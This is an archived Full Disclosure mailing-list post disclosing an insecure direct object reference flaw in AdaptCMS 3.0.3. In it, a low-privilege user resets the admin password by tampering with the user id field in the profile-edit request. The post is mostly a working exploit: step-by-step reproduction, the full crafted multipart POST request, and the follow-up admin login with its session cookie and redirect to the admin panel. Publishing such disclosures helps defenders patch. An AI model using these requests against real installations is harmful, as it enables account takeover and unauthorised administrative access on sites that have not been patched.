---
title: IDOR "Change Password" Functionality - adaptcmsv3.0.3
url: https://seclists.org/fulldisclosure/2025/Jun/7
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:27.167202
---

# IDOR "Change Password" Functionality - adaptcmsv3.0.3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# IDOR "Change Password" Functionality - adaptcmsv3.0.3

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 1 Jun 2025 16:09:23 +0100

---

```
# Exploit Title: IDOR "Change Password" Functionality - adaptcmsv3.0.3
# Date: 06/2025
# Exploit Author: Andrey Stoykov
# Version: 3.0.3
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

IDOR "Change Password" Functionality #1:

Steps to Reproduce:

1. Login as user with low privilege and visit profile page
2. Select "Edit Your Profile" and click "Submit"
3. Trap the HTTP POST request
4. Set "data[User][password]" and "data[User][password_confirm]" values
"Passw0rd!"
5. Set "data[User][id]" value to "1"
6. This would change the password of the "admin" account

// HTTP POST request changing password

POST /adaptcms/users/edit HTTP/1.1
Host: 192.168.58.131
Content-Length: 2090
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://192.168.58.131
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryDvhxmc78yz9KfFbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
[...]

[...]
4d63437ebea6a2ef6648b29cc1c43ea70600295a
------WebKitFormBoundaryDvhxmc78yz9KfFbn
Content-Disposition: form-data; name="data[User][password]"

password
------WebKitFormBoundaryDvhxmc78yz9KfFbn
Content-Disposition: form-data; name="data[User][password_confirm]"

password
------WebKitFormBoundaryDvhxmc78yz9KfFbn
Content-Disposition: form-data; name="data[User][email]"

privesc-test () test test
------WebKitFormBoundaryDvhxmc78yz9KfFbn
Content-Disposition: form-data; name="data[User][id]"

1
------WebKitFormBoundaryDvhxmc78yz9KfFbn
[...]

// HTTP Response

HTTP/1.1 200 OK
Date: Fri, 30 May 2025 19:56:17 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Content-Length: 13925
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

// HTTP POST request logging in with admin account

POST /adaptcms/login HTTP/1.1
Host: 192.168.58.131
Content-Length: 262
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://192.168.58.131
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
[...]

_method=POST&data[_Token][key]=dc18f92e4d0b810c603f45f2189b220de543a972&data[User][username]=admin&data[User][password]=Passw0rd!&data[_Token][fields]=5ba74a784fe0258a12c30194ef6a09b97a86bb1d%3A&data[_Token][unlocked]=

// HTTP Response

HTTP/1.1 302 Found
Date: Fri, 30 May 2025 19:56:33 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Set-Cookie: adaptcms=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT;
Max-Age=0; path=/
Set-Cookie: adaptcms=2aaosqqksob20a98viieaq8j44; expires=Mon, 02-Jun-2025
19:56:33 GMT; Max-Age=259200; path=/; HttpOnly
Location: http://192.168.58.131/adaptcms/admin
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

### Current thread:

* **IDOR "Change Password" Functionality - adaptcmsv3.0.3** *Andrey Stoykov (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")